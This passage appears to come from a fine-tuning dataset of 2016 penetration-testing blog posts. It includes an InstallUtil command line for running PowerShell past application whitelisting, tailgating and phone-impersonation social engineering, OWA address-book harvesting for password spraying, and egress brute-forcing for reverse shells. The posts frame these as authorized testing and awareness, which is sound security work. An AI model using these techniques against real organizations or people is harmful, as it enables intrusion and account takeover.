environment):\n\nC:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\InstallUtil.exe\n/logfile=C:\\Users\\fmc\\Desktop\\log.txt /LogToConsole=false /U\n\nClick Apply and then close the properties window.\n\nNow, head back to your Desktop if you\u2019re not already there. Drag the powerup.exe file onto the InstallUtil shortcut file.\n\nYou should see a command prompt pop up while the script executes. If you open Task Manager, however, you\u2019ll notice that cmd.exe isn\u2019t in the process list; only InstallUtil.exe.\n\nWe can confirm this by running the following from a Windows command prompt right after we drag the powerup.exe file onto the InstallUtil shortcut:\n\nwmic process list full > Desktop\\save.txt\n\nFrom inspecting the output of the wmic command, we find that InstallUtil.exe was actually called via explorer.exe and not cmd.exe. Sweet!\n\nOnce the script finishes executing, you should find the allchecks.txt file on your desktop. Open the allchecks.txt file to inspect the output from the PowerUp.ps1 Invoke-AllChecks method.\n\nThere you have it. We have a method to execute PowerShell scripts in environments that have application whitelisting enabled and have disabled access to powershell.exe and cmd.exe. You can run virtually any PowerShell script that you want to with this. Just a few items to note though:\n\nMake sure your script doesn\u2019t use Write-Host\n\nThis will cause the program to crash\n\nUse Write-Output or Out-File instead\n\nIf your script prompts for user input, use the -Force option when you insert the function call at the bottom of your PowerShell script\n\nThere may be other characters and functions that cause issues for this method. Please let me know if you run into any and we can try to get it sorted out.\n\nThis method can also be used to bypass AV. We will give a walkthrough of that process in an upcoming video segment!\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Lawrence's List 090216\"\nTaxonomies: \"News, Darkweb Scanning, Dropbox, Election 2016, Election Fraud, Linux, network packet filtering support cgroups, OnionScan, Voter Fraud\"\nCreation Date: \"Fri, 02 Sep 2016 17:14:19 +0000\"\nLawrence Hoffmann //\n\nElection fraud is something I\u2019ve mentioned here recently. The reality we must face here is that any time a digital system is used for voting there is the possibility of fraud via some form of hacking. The risks posed by digital polling are indeed something that must be addressed and mitigated where possible. The obvious consequence of a successful hack of the election systems is that a candidate wins by unfair or untrustworthy means. Consequences run deeper though, a rigged election (whether or not the winning candidate had anything to do with the rigging) would undermine trust in the democratic process at a time when the government can least afford to look any more shady than it has these past few years. Andrew Appel has posted a series of mitigations that could be considered on the Freedom to Tinker blog. Part one discusses how officials might audit the elections to at least detect if hacking were happening. Part two discusses the US government\u2019s take on cybersecurity and addresses how the \u201cno one but us\u201d concept can only hurt us.\n\nhttps://freedom-to-tinker.com/blog/appel/security-against-election-hacking-part-1-software-independence/\n\nhttps://freedom-to-tinker.com/blog/appel/security-against-election-hacking-part-2-cyberoffense-is-not-the-best-cyberdefense/\n\nIt turns out that the rumors of a Dropbox hack are true. Just north of 68 million records have been obtained from Dropbox, it appears in 2012. These records contained usernames and hashes, the hashes come in two varieties with some of the users having bcrypt hashes in the leak and others having SHA1. Thankfully the SHA1 hashes do not include their salts, as that would have made cracking the hashes much less difficult. The bcrypt hashes do have their salts included in the leak. Linked is an independent verification of the leak.\n\nhttps://www.troyhunt.com/the-dropbox-hack-is-real/\n\nA while back I put a couple of articles on here that discussed darkweb scanning with OnionScan. It was a series, we\u2019ve seen parts one and two and have been promised a rundown of how the graphs were made in those postings. Part three is up!\n\nhttp://www.automatingosint.com/blog/2016/08/dark-web-osint-with-python-part-three-visualization/\n\nIt looks like we may soon see network packet filtering support for cgroups. For those not in the know Control groups (cgroups) are a kernel feature that allow processes to be grouped and resources to be controlled for that group (think Docker). Some members of the Linux kernel development team are currently discussing possible solutions that would allow use of the Berkley packet filter, or netfilter, to control network traffic for a particular group. This would mean that filters could be applied to ingress or egress traffic of a particular, limiting what kinds of traffic that group could generate or receive. This has some nice security implications and could make a nice addition to Docker\u2019s current capabilities.\n\nhttp://lwn.net/Articles/697462/\n\nhttp://lwn.net/Articles/698080/\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How Does Lets Encrypt Gain Your Browsers Trust?\"\nTaxonomies: \"Author, Ethan Robish, How-To, encryption, Let's Encrypt, SSL/TLS certificate\"\nCreation Date: \"Tue, 06 Sep 2016 14:23:39 +0000\"\nEthan Robish //\n\nLet\u2019s Encrypt is a free service that allows you to obtain a free (as in beer) SSL/TLS domain validation certificate to use as you wish.  Here is what they have to say about themselves:\n\nLet\u2019s Encrypt is a free, automated, and open certificate authority (CA), run for the public\u2019s benefit. Let\u2019s Encrypt is a service provided by the Internet Security Research Group (ISRG).\n\nThe key principles behind Let\u2019s Encrypt are:\n\nFree: Anyone who owns a domain name can use Let\u2019s Encrypt to obtain a trusted certificate at zero cost.\n\nAutomatic: Software running on a web server can interact with Let\u2019s Encrypt to painlessly obtain a certificate, securely configure it for use, and automatically take care of renewal.\n\nSecure: Let\u2019s Encrypt will serve as a platform for advancing TLS security best practices, both on the CA side and by helping site operators properly secure their servers.\n\nTransparent: All certificates issued or revoked will be publicly recorded and available for anyone to inspect.\n\nOpen: The automatic issuance and renewal protocol will be published as an open standard that others can adopt.\n\nCooperative: Much like the underlying Internet protocols themselves, Let\u2019s Encrypt is a joint effort to benefit the community, beyond the control of any one organization.\n\nYou might be wondering how such a service can exist.  On the technical side the answer is fairly straightforward.  Let\u2019s look at why your browser automatically trusts certificates issued by this provider.\n\nInspecting a certificate obtained from Let\u2019s Encrypt shows that it was issued by \u201cLet\u2019s Encrypt Authority X3\u201d which is in turn signed by \u201cDST Root CA X3\u201d.\n\n Certificate Issuer Details \n\n Certificate Chain \n\nNext, I opened up the list of my system\u2019s certificates.  I run Mac OS X, but you can find a similar list on your operating system as well.  I searched for the certificate authority (CA) I found earlier, \u201cDST Root CA X3\u201d, and it came right up.  Mystery solved.  Let\u2019s Encrypt has been issued an intermediate certificate that is signed by a root CA certificate that comes bundled with your operating system.  More on that below.\n\nOne side note is that while Internet Explorer, Safari, and Google Chrome all use the host operating system\u2019s certificate store, Mozilla Firefox comes bundled with it\u2019s own.  \u201cDST Root CA X3\u201d is listed there, but it is interesting to see that Let\u2019s Encrypt\u2019s certificates are listed directly there as well.\n\n Let\u2019s Encrypt Certificate Authority in Firefox \n\nTo confirm our bit of sleuthing, this Let\u2019s Encrypt blog post details how it obtained its first certificates.  It essentially echoes what we\u2019ve just uncovered.\n\nThe post also had a nice diagram showing the signing relationships.  There are a couple more moving parts in the diagram because Let\u2019s Encrypt actually first generated a key pair for its parent organization, the Internet Security Research Group (ISRG), which is shown as well.\n\n Image Credit: https://letsencrypt.org/2015/06/04/isrg-ca-certs.html \n\nOne question remains, however, since the post only mentions Let\u2019s Encrypt Authority X1 & X2.  But my earlier screenshots show a Let\u2019s Encrypt Authority X3.  What\u2019s going on?  This forum post answers that question.  In an effort to gain better backwards compatibility, Let\u2019s Encrypt had two new certificates issued named Let\u2019s Encrypt Authority X3 & X4.\n\nIdenTrust (in the form of the DST Root CA X3 certificate we found earlier) is already a trusted CA in your system\u2019s certificate store.  By having IdenTrust sign Let\u2019s Encrypt\u2019s intermediate certificates, it allowed Let\u2019s Encrypt to bypass what it claims is a 3-6 year process of getting their own root CA into operating systems certificate stores.\n\nRemember how I said that Firefox has it\u2019s own self-contained certificate store?  Turns out it\u2019s much quicker to get a certificate added there because Let\u2019s Encrypt has announced that the \u201cISRG Root X1\u201d key shown in the diagram above will be included starting with Firefox 50.\n\nThere are already instructions on implementing Let\u2019s Encrypt for many operating systems and web servers here, along with countless other articles that you can use Google to find.  However, if there\u2019s enough interest I may do a follow-up post where I walk through my own non-trivial setup.  I created a workflow that allows integrating Let\u2019s Encrypt into a pre-existing Nginx configuration with zero downtime.  In addition, it lets me quickly secure a new sub-domain at any time using Let\u2019s Encrypt.  If you\u2019re interested in this type of setup let me know on Twitter at @EthanRobish.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Honeyports & ADHD!!!\"\nTaxonomies: \"Author, Blue Team, Blue Team Tools, John Strand, ADHD, honeyports\"\nCreation Date: \"Wed, 07 Sep 2016 15:30:33 +0000\"\nJohn Strand //\n\nLets take a look at how to use HoneyPorts on the new Active Defense Harbinger Distribution.\n\n[embed]https://www.youtube.com/watch?v=0YZjNdbTnoc[/embed]\n\nFor those of you who do not know, this is a really cool script which dynamically blocks an IP address which makes a full established TCP connection.  This is cool because it makes spoofing very hard to do.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Lets Get Physical* Part 1; Defeating Wetware Access Controls\"\nTaxonomies: \"Physical, Red Team, breech, defeating access controls, getting in, insiders, olivia newton john, physical pen test, physical pen testing\"\nCreation Date: \"Thu, 08 Sep 2016 16:00:59 +0000\"\nSally Vandeven //\nI found myself with a little extra time one day (and I didn\u2019t tell my project manager) so I thought it would be a great time to write a blog post.  I asked two friends/colleagues if there were any topics they would like to see covered and interestingly, they both independently responded with the same topic.  They wanted to read about some of the physical pen tests that we do.  Excellent idea! It is interesting, intriguing and mostly fun (more on that later) \u2013 so here you go.\nOrganizations hire us to test the security of their networks.  When you take a 30,000-foot view of computer security in general it basically boils down to access control.  It is all about keeping bad stuff out of the organization and preventing the good stuff from leaving the organization. Of course it is 2016 and in security we all have come to accept the premise that bad stuff WILL happen so we should focus on detection as well as prevention.\nSecurity engineers, auditors and pentesters all have the same goal \u2013 to improve an organization\u2019s security posture. But, as pentesters, it is our job to demonstrate risk in a controlled manner.  Instead of telling an organization what could happen if they don\u2019t patch their systems or look at their logs we show them what can happen.  This can be very eye opening to skeptical managers that are hesitant to allocate budget for security projects.  I have found this to be especially true when it comes to demonstrating physical access attacks.  Let me explain with an example.\nA colleague and I were doing a physical penetration test for an organization.  We were tasked with entering the building using social engineering only.  In this case, no lock picking and no badge cloning. The building had RFID access badge entry on all exterior doors as well as many interior doors.  At every locked door was a sign that read \u201cNo Tailgating\u201d. There was a front door that remained open during business hours but a guard/receptionist was stationed immediately inside with full view of the door.  There was a sign-in sheet at the reception desk with a sign that read \u201cVisitors Must Sign In\u201d.\n\nVideo cameras were trained on all ingress doors and the guard/receptionist at the front entrance had a bank of monitors with the video feeds. Inside the building, employees were required to use an access badge to operate the elevator. There were of course stairwells but they were locked from the stairwell side and required an access badge to open from the stairwell.  Only the exterior door on the ground floor of the stairwell could be opened from inside without any access control.  This of course was a safety measure to ensure that all people inside the building could easily get out in case of an emergency. In other words, if you found yourself in a stairwell without the proper access card, the only place you could go was outside.  Also, all employees worked in cube farms or open office areas, each of which was behind a locked door with access controls enforced by the RFID badges. To some this sounds like bulletproof security.  But, to the bad guy or the scheming pentester, it sounds like an easy mark.  Why? Because as pentesters we learn that it is easy to defeat access controls if you look and act like an insider \u2013 like you belong there.\nLook Like an Insider\n\nAny good physical assessment should begin with some reconnoitering -- colloquially referred to as \u201ccasing the joint\u201d.  We rent an inconspicuous car and drive to the target site looking for clues as to how we will go about appearing like we belong.  If employees are wearing suits, we wear suits. If employees are dressed casually, we dress casually.  If employees are wearing or carrying a badge we create and wear a similar badge, etc. Whatever it takes to blend in.\nFor this particular assessment we observed that employees had access badges and most were attached to a particular color lanyard.  There was an outdoor picnic table near an employee entrance so we sat at the table and got close enough views of people entering and exiting the building with their badges that we were able to recreate one with surprising accuracy. These were simply look-alikes, not RFID clones so the only function they would serve was to help us look like legitimate employees. You might wonder if the staff we were observing found it suspicious that unfamiliar people were sitting at their outdoor lunch spot and you would be correct to wonder that.  The answer is, I imagine some do but in our experience rarely, if ever, do they approach us or report us.  We also observed that employees were letting others tailgate in - despite the signs on the door forbidding such actions.\nAct Like an Insider\nOnce we got the lay of the land and had created or purchased all the props that we needed, we made our move to enter the building.  With physical testing involving social engineering, unlike a remote network assessment, each person gets one chance; if you get caught you are done.  Because of this we usually enter one at a time and stay separated inside the building.  On this particular occasion, I entered first by tailgating in with other employees.  They were happy to hold the door for me.  Why?  Because people are generally considerate of one another and want to be helpful and we take advantage of that.  I know that sounds very cold and cruel but since that is how criminals operate and we are trying to demonstrate risk, we do it too. So here is how it works; if you set up the situation such that anyone who does NOT hold the door for you appears rude then you will get in. This particular attempt happened like this:\n\nThe look-alike badge was hanging around my neck.\nI was carrying some books and papers in one arm and also holding my morning cup-o-joe.\nMy phone was at my ear as if I was talking to someone\nI smiled and made eye contact with the people approaching the door (I had watched them from the parking lot and carefully timed my approach accordingly).\n\nThe door was graciously held open for me as I entered the building.  Why did they let a stranger in?\n\nWhen someone is on the phone, others are hesitant to interrupt.\nPeople are conditioned to hold the door for others \u2026 especially older people and women.  In my case, I am an older woman (never thought that would be an advantage in this business, right?)\nI looked like I might work in the building and I appeared happy and confident that I was in the right place so anyone who refused to help me at that point would have created a messy situation and probably felt like a jerk in the process. (By the way, this is one of the things about physical testing that most of us really don\u2019t like \u2013 taking advantage of someone else\u2019s good intentions)\n\nBe an Insider\nWhat happens next once you find yourself inside the building? I find this the trickiest couple of minutes on the assessment because in most cases, you don\u2019t know the layout of the building unless you have been lucky enough to find a floor plan ahead of time.  If the people who let you in the building had any suspicion at all they will certainly be more likely to take some action if at this point you look like you don\u2019t know where you are going. What I have found most successful is to enter boldly and plow ahead, looking hurried \u2013 like I am going to be late for a meeting.\n\nOnce I find myself in a location that is quiet, I stop and take stock of the situation thus far. For example, I look for a quiet corridor, a conference room, a restroom or even at a seat at a bank of unoccupied cubes. This is also when I contact my colleague via SMS and start a photo timeline.  A photo timeline is created by just snapping photos with the phone at regular intervals. The timeline can prove very helpful later during the assessment as well as later while writing up the report.  Basically the photo timeline helps me recreate my path in the building, provides timestamps for the customer (they can check against access logs) and may be the breadcrumb trail that is needed to get back out undetected.  When we first entered this particular building we had no idea that we would end up inside for several hours.\nDuring this test I found an exterior unalarmed door near the back of the building with little activity. There was a video camera trained on the door but we were working under the assumption that the guard would probably not be watching and that turned out to be the case. Via SMS I communicated with my colleague to guide him to the door and opened it from the inside allowing him to enter.  He could have tailgated in as well but it provides more value to the customer if we can demonstrate different methods of entry.\nNow that we were both inside we parted ways in order to cover more ground during our search for the flag.  The flag we were tasked to find by our point of contact (PoC) was the data center and we were asked to attempt entry, take pictures as proof and then leave -- tampering with hardware was not in scope.\nSince most areas required card access for entry we had to tailgate in everywhere, including the elevator.  We learned this the hard way.  After thoroughly searching one floor of the building and comparing notes with my colleague, we decided it was time to move to another floor.  I found an elevator and \u201ccalled\u201d it to my floor.  When the doors opened it was empty and there was no one else waiting to ride the elevator; I was alone. I entered the elevator and checked out the control panel \u2013 there was an RFID access pad.  Hmmm. On the off chance that I would not need to swipe, I pushed a button for another floor.  Nothing.  The light on the RFID pad was red. Not a good sign. I tried another button.  Nothing.  In the meantime, the doors to the elevator closed and I was inside.  It instantly became stuffy inside so I pushed the button for the floor I was on.  Surely that would be allowed. Nothing. I was stuck inside and could not move.  I texted my colleague and to my surprise I had enough signal and my text went through.  He found his way to what we hoped would be the same elevator on another floor and pushed the button to summon the elevator.  When the doors opened it was empty -- another car had been summoned instead.  I ended up stuck inside the elevator for about 10 minutes but it seemed like 2 hours! Ultimately, because of others using the elevator \u201cmy\u201d car eventually was called into service and when the doors opened I remained inside and tried to stay calm.  The person entering the lift looked at me and I smiled.  They swiped their badge and pushed floor 3, exactly the floor I was hoping for and I was able to \u201chitchhike\u201d to the next floor without proper authorization.  If the person that had entered the elevator to go to the third floor noticed that none of the LEDs for any of the floors were illuminated (meaning I had not swiped and requested a particular floor) they didn\u2019t say anything to me and allowed me to ride along.  Again, people tend to avoid conflict and don\u2019t generally like to be rude so we use this to our advantage.\nWe spent hours inside the building but did not find the datacenter, our flag.  It was unmarked and apparently well hidden.  Frustrated, we found a cafeteria and sat down together to make a new plan.  Surely the datacenter was behind one of the many unmarked, locked doors that we had encountered that morning but which one?  Lock picking and badge cloning were out of scope for this particular assessment. We asked ourselves what access control is left to defeat?  The answer of course is the human -- wetware.  So we decided to ask for help.  We approached a kind looking receptionist (not the one at the front door because she was trained to be suspicious and spot unauthorized activity).  We found a suite of offices on the floor that we were guessing might be the right floor (again more hitchhiking to get back there) and entered the suite.  The receptionist asked if she could help us and we said, \u201cYes you can! We are looking for the datacenter because we are supposed to meet someone there but we cannot find it.  Can you point us in the right direction?\u201d\nUnlike the guard at the front door, this person is trained to be helpful and courteous and she dutifully answered our question.  Bingo.  Before we knew it we were standing in front of the datacenter.  The receptionist noticed that the person we were supposed to meet was not there and asked us if she should call him.  We said, no that we would wait for him and thanked her for her help.  She left.  Now we just had to find a way in.  My colleague and I had decided that it was boom or bust.  We could both hear John\u2019s voice in our heads, \u201cPush it right to the edge! If you don\u2019t get caught you didn\u2019t try hard enough.\u201d  So we knew that we were not leaving until either 1) we got in or 2) we got caught.\nYou see, getting caught provides valuable information to the customer as well.  We defeat as many controls as we can to show where the weaknesses are but we keep going until we get caught to show where the strengths are. Ultimately after several attempts to convince someone to open the datacenter door and allow us access, someone alerted security and we were promptly asked to leave.  By the way, we had a Get-Out-of-Jail-Free card, a letter signed by an executive stating that we were authorized to be there and it included phone numbers that the guard could call to verify.  Interestingly, in that particular case we were just asked to leave the building. We did. Mission accomplished.\nRecap of the access controls defeated:\n\nThere are multiple entrances to the building through which employees can come and go, but none use turnstiles to ensure that people enter one at a time. Let\u2019s face it. The amusement parks got this one right because every hot body that enters the park better have a valid ticket \u2013 it\u2019s their bread and butter!  It\u2019s much more difficult to get away with jumping a turnstile than casually entering through a door held open by someone else.\nThere is only one entrance with an enforcing control; the front door with the guard.  \nA single guard cannot watch the front door, check badges, get visitors to sign-in and watch all the monitors all the time.\nThe elevators cannot detect how many people step into the car at one time; to put the elevator in motion requires only one badge swipe.\nPeople are generally considerate of one another and want to be helpful.\n\nComing up next:\nLet\u2019s Get Physical Part 2; Defeating Hardware Access Controls\nStay tuned\u2026\n_______\n*Want to have a little soundtrack while you read this?  Olivia Newton John's \"Physical\" is the obvious choice!\n[embed]https://youtu.be/vWz9VN40nCA[/embed]\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Downloading an Address Book from an Outlook Web App (OWA) Portal\"\nTaxonomies: \"External/Internal, Red Team, Burp, Duct Tape, Mechanical Engineering, password spraying, pen-testing\"\nCreation Date: \"Wed, 14 Sep 2016 15:46:39 +0000\"\nCarrie Roberts // \n\nUpdate 10/03/16: Want to download the address book automatically with PowerShell? Check out Beau Bullocks latest additions to MailSniper\n\nAs part of a penetration test, you've gained access to an employee's web mail, perhaps through a password spraying attack.\n\nOutlook Web App Login\n\nYour original password spray was done with a limited username list based on what you could find through reconnaissance. Now you would like to repeat the password spray with the full username list but you don't see a way to download the address book from the OWA interface.\n\nUggghhh, do I need to write some custom web scraping code?\n\nNo, Wait! Burp Suite Pro to the rescue. Burp Suite will automatically pull email addresses out of responses and include them in an \"Email addresses disclosed\" issue report. All we need to do is proxy our web traffic through Burp as we browse the OWA address book.\n\nIn the example above, 3,135 email addresses were extracted as I browsed the address book via OWA. I simply started a new email and selected the \"To:\" link to bring up the address book.\n\nI noticed that only a limited amount of results were returned, but if I used the scrollbar to scroll the address list from top to bottom, it would force all the addresses to load. As they were loaded, Burp successfully extracted them, leaving me with the entire address book that I could copy and paste into other tools.\n\nNote that Burp is configured by default to do \u201clive passive scanning\u201d, which reports on disclosed email addresses. If for some reason you have disabled that feature, you can re-enable it on the \u201cScanner-->Live Scanning\u201d tab as shown below.\n\nUpdate: I just used this technique on an address book that had over 16 thousand entries, and I got tired of holding the mouse button down to scroll through the whole list. The Mechanical Engineer in me shined through with this solution:\n\nGo Duct Tape!!!\n\nFor related posts, see the following:\n\nExploiting Password Reuse on Personal Accounts: How to Gain Access to Domain Credentials Without Being on a Target\u2019s Network: Part 1\n\nPassword Spraying Outlook Web Access \u2013 How to Gain Access to Domain Credentials Without Being on a Target\u2019s Network: Part 2\n\nQuestion:  What Can I Learn from Password Spraying a 2FA Microsoft Web App Portal? Answer: Enough to make it worth it!\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Mining Marys Social Media Antics for Social Engineering\"\nTaxonomies: \"InfoSec 201, fun with social networks, kony2012, social engineering, social media mining\"\nCreation Date: \"Fri, 16 Sep 2016 15:15:23 +0000\"\nChristine Sorensen //\n\nLet\u2019s talk about Mary.\n\nMary Watson is a girl in her twenties and just graduated from Midtown University with her bachelors in Fashion Merchandising.\nMary is now looking for her very first \u201cbig girl\u201d job. Everyone warns her about her reckless Facebook activity and how that might ruin her chances at a new job in the fashion industry. She recalls party photos she is tagged in, The Lonely Island YouTube videos she shared, and controversial topics about what color the dress was and Kony 2012 she posted. She is now worried.\n\nMary is smart though. She sets her Facebook privacy from \u201cPublic\u201d to \u201cFriends\u201d so that only her connections can view her profile. She also changes her name on Facebook from \u201cMary Watson\u201d to \u201cMary Jane\u201d thinking she is so clever by using her middle name instead of her last name. \u201cFuture employers can\u2019t find my Facebook now,\u201d she says to herself. Mary successfully lands a job at Marvel Fashions.\n\nTwo years later, the newly married Mary Parker is still at Marvel Fashions. The company decides to hire Black Hills Information Security for their services. BHIS\u2019s intern, Harold Osborn (Harry for short), is assigned to this project. Harry calls Marvel Fashions\u2019s IT department with a girly voice and impersonates Mary. The people at IT answer.\n\u201cMarvel Fashions, Flash Thompson speaking.\u201d\n\u201cHi,\u201d Harry\u2019s voice goes up an octave. \u201cI\u2019m Mary Parker, and I forgot my password to the system. Silly me.\u201d\n\u201cI\u2019m sorry, Ms. Parker, but I can\u2019t just give that to you. I\u2019m going to need some information from you before I can do that.\u201d\n\u201cOf course. What kind of information do you need, Flash?\u201d Harry flirts.\n\u201cYour birthday and your mother\u2019s maiden name.\u201d\nHarry hangs up the phone. It\u2019s time to do some searching.\n\nThe easiest stop, Facebook. Harry searches the name \u201cMary Parker\u201d. However, no profiles are returned. Harry redirects to LinkedIn. He accesses Marvel Fashions\u2019 profile, finds the list of employees, and searches for \u201cMary Parker\u201d. The profile appears with a photo of a woman with rich brown hair and dark hazel eyes. He now has a face for the name.\nHarry moves back to Facebook and again searches the name \u201cMary Parker\u201d again. Still no results. He resorts to Google and searches her name there.\n\nThe second link returned is to the website The Knot with a wedding page for the marriage of \u201cPeter Benjamin Parker and Mary Jane Watson\u201d from a year ago.\n\u201cPerfect!\u201d Harry thinks to himself. He returns to Facebook and now searches for \u201cMary Jane\u201d. The first profile that appears is the rich brown-headed Mary he\u2019s looking for. However, Mary was smart all those years ago, and there isn\u2019t  much available to see on her profile. Harry is frustrated as he clicks through her photos. He stops on one picture with a comment from Madeline Garfield Watson, \u201cMy daughter is GORGEOUS!!!1!\u201d\nMadeline Garfield Watson must be Mary\u2019s mother. Her mother\u2019s maiden name is Garfield. Harry is excited, but he still needs the date of birth.\n\nHarry returns to Google and searches for \u201cMary Jane Watson\u201d again. The first link is to Mary\u2019s old Twitter account @maryjane2009*. Harry scrolls through years of tweets, cringing at each hashtag. Finally, he stops at a post from 2012:\n\nThat\u2019s her 21st birthday. Her date of birth is June 19, 1991.\n\nHarry calls Marvel Fashions\u2019s IT department in the girlish voice again and provides them with the new information.\nHarry gets Mary\u2019s password. Mary wasn\u2019t as smart as she thought she was.\n\nMary\u2019s story is fiction (and there's no one named Harry at BHIS.... or is there?) but like the best kind of fiction it's not hypothetical. This kind of social engineering and research happens during actual phishing attempts. You can avoid being the target of this kind of predicament. Start by restricting what you put on social media networks, always being aware that once it\u2019s online, it\u2019s online forever. You can mitigate the risk by also deleting accounts and sites you no longer use. Harry managed to find Mary\u2019s middle name through The Knot (Mary\u2019s wedding had happened over two years ago when Harry found it). Mary also had a Twitter account that was public, where she carelessly threw around personal details. Had she changed the setting of her account from \u201cPublic\u201d to \u201cProtected\u201d, Harry wouldn\u2019t have been able to find her birthday. As for her mother\u2019s maiden name, that was something out of Mary\u2019s reach unless she deleted her entire Facebook account or unfriended her mom (which her mom might not have been too happy about). There is a risk with using social media, for most of us the reward of keeping up with distant friends and family far outweighs the risk, but it\u2019s important to realize that risk still exists. Mitigate it by staying mindful, limiting access and keeping very personal details off-line. It makes our job here at BHIS a lot more difficult, and that makes us happy!\n\n_____\n*Ironically/not ironically the Twitter account @maryjane2009 is a real, dead account, full of information we gleaned that her birthday is on the 13th, she's Italian and isn't from the US, and she's older than 25. Ahhh....\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Adding Egress Brute Force to PowerShell Payloads\"\nTaxonomies: \"External/Internal, Red Team, Brute Forcing, Listeners, PowerShell, SET\"\nCreation Date: \"Mon, 19 Sep 2016 19:07:07 +0000\"\nGuest post* by Robert Schwass //\n\nWe\u2019ve all been there. You craft the perfect phishing email, register a great domain name, your multi handler is set up ever so perfectly. And then you wait and nothing happens. Egress packet filtering has destroyed all your hard work.\nNow there are payloads and listeners designed specifically for this sort of thing, and they usually work well. But if you're like me you want to have options. PowerShell has been my bread and butter as of late, so I decided to write a few lines of script that would allow me to try every port out towards my listener until I found an open one, and then use that port in my payload.\n\nBe sure to set your own host address for your listener, also note the $wait variable has 2000 set as the timeout, you can increase this number to ensure you have enough time between client and server, but then it takes longer to get through all the ports so tweak as needed.\nOn the server side I wanted to have just as many options. No matter the listener; metasploit multi/handler, or any of the various cats (nc, ncat, PowerCat, gcat, dnscat, etc), I wanted a solution that could handle my reverse shells coming in on any port. IPtables to the rescue! This little one liner forwards all ports 65k and change to one of my choosing. (4444 in this case)\n\nAfter setting the IPtables, fire up the metasploit reverse tcp listener.Remember to use the port you specified in the iptables command (4444)\n\nThrow the first bit of code in front of your favorite PowerShell reverse tcp payload. I generated mine with the Social Engineering Toolkit (SET). I simply had to modify the code to use the IP address I set in the Egress loop ($address = $Computername) and comment out  the line below that that is setting the port as I already set the variable named $port in my Egress loop.\nWatching the PowerShell in action it fires the shell when it hits port 25 as this is the first open port to the listener.\n\nThat Is Nothing New\nI am aware that Metasploit has an multi/shell/reverse_tcp_allports payload to listen on all ports. But like I said, we want flexibility. We aren\u2019t always going to be in a situation where we can use a fancy pants Metasploit reverse tcp listener. Maybe you got root access to an old unused development web server on the DMZ and you want to use that as the landing place for your payloads? There are often constraints in place that can get in the way of installing all the tools of the trade. Perhaps you popped a box that has ncat already running on it because the user installed it with Nmap. Whatever your reason for not having the multi/shell/reverse_tcp_allports payload, this technique may be able to help.\nThe Same Concept with a Powercat Payload\nI got Powercat up and rolling, so I generate a payload.\nThis spits out a ton of code but at the bottom there is the execution of the main function.This looks like as good of a place as any to stick some variables.\nSo I throw my loop in there right above the call to the Main function so it executes before everything else. And I change the IP address and port number in the function call to their respective variables from my loop. (Powercat Payload didn't like PS ISE, so I used Notepad++)\nI save this script as payload.ps1  and start my PERSISTENT netcat listener. Again I use port 4444. We must be persistent as the payload hits the port twice and will kill the listener.\n\nThen I execute payload.ps1\nOnce it hits port 25 (first open port).... Success!\nConclusion\nSo there you have it. A few lines of PowerShell, and some iptables, and you have a way to potentially brute force your way out of some networks that are attempting to block egress traffic. If you are going to take the time to get code on a system, why not add a few more lines to increase your chances of getting that shell out? Even if you are in a situation where you can use theallports flavors of Metasploit Multi/Handler listeners, adding a simple loop to your PowerShell payload can greatly increase the odds of success.\nResearch Limitations\nI tested this against iptables using both REJECT and DROP on the packets and it worked. You may or may not experience different results behind enterprise firewalls.\nThere are other ways to test for open ports with PowerShell. During my research, the method I used allowed me to make full connections with a timeout, which seemed to work the best.\n\n______\n*We love guest posts! Want to write for us? Use our contact form to let us know your title, and brief summary of your idea.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Turning a Raspberry Pi 3 Into a Cloaking Device With goSecure VPN\"\nTaxonomies: \"Author, How-To, Jordan Drysdale, cloaking, goSecure, great success, IADGov, magical time, non-attrib, raspberry Pi, VPN\"\nCreation Date: \"Wed, 21 Sep 2016 17:39:44 +0000\"\nJordan Drysdale //\n\nThis article, like the IADGov link here has three major steps. First, acquire a Raspberry Pi and a VPS running CentOS 6.8. Second, configure the server and Raspberry Pi. Last, we discuss and learn how to cloak all communications that use the Pi as your new router. I will demonstrate with a small peripheral monitor how to get the Pi connected to a Wi-Fi network that has a Terms of Use and Agreement page. Through this connection, all of my network traffic behind the Pi routes through the VPN tunnel for basically non-attributable communication to the Internet. See this article for purchasing servers with gift cards turned in to bitcoins.\n\nBasics first: Link for how to \u201cimage\u201d your Raspberry Pi with whatever operating system you choose: https://www.raspberrypi.org/documentation/installation/installing-images/. For brevity\u2019s sake, I am using Raspbian in this article.\n\nQuick and easy installation minimum for goSecure VPN server side:\n\nPick a platform, any of the following have CentOS 6.8 available. For full non-attribution, see the blog linked in paragraph one. The goSecure VPN server configuration is fully supported on CentOS 6.8, so please choose this operating system when selecting your virtual private server.\n\nDigital Ocean: https://www.digitalocean.com/\n\nLinode: https://www.linode.com/\n\nAmazon EC2: https://aws.amazon.com/ec2/\n\nWhen purchasing a VPS, you will not need to complete the majority of steps listed here:\n\nhttps://iadgov.github.io/goSecure/documentation.html. Under Step 1 - Build Server Side network configuration - you can skip the \u201cInternal network configuration\u201d, since, well Amazon isn\u2019t likely interested in you configuring VPN access to their trust networks.\n\nWithout further ado, the server installation commands:\n\nroot@centos6.8:~ $ cd ~\nroot@centos6.8:~ $ wget https://iadgov.github.io/goSecure/files/install_scripts/gosecure_server_install.py\n\n ### this command uses wget to go grab your server install python file - this is the server install, be sure you pull the server_install.py ###\n\nroot@centos6.8:~ $ sudo python gosecure_server_install.py client_id user1@cloaker.dev client_psk \u201clongpasswordforuse\u201d\n\n ### please use whatever credentials and domain you want, the domain is irrelevant and your system will reboot after this command completes ###\n\nThat is all it takes. However, to change, edit or modify users, you will need to modify the following two files:\n\nroot@centos6.8:~ $ sudo yum install nano -y   ### adding nano text editor ###\nroot@centos6.8:~ $ sudo nano /etc/ipsec.conf  ### add users in here\nroot@centos6.8:~ $ sudo nano /etc/ipsec.secrets ### add secrets in here\n\nQuick and easy installation minimum for goSecure VPN client side:\n\nThe following steps are all taken from the IADGov site and there are lots of beautiful screenshots out there.\n\n1. Configure the Raspberry Pi from the terminal with 